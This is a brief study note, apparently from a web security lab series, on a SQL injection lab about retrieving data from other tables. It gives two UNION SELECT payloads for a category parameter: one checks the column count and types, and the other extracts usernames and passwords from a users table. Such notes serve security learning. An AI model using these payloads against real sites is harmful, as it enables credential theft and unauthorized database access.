---
{"dg-publish":true,"permalink":"/src/site/notes/src/site/notes/src/site/notes/src/site/notes/main/cs/ps-wsa-labs/sq-li/retrieving-data-from-other-tables/"}
---






1. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:`'+UNION+SELECT+'abc','def'--`
2. Use the following payload to retrieve the contents of the `users` table:`'+UNION+SELECT+username,+password+FROM+users--`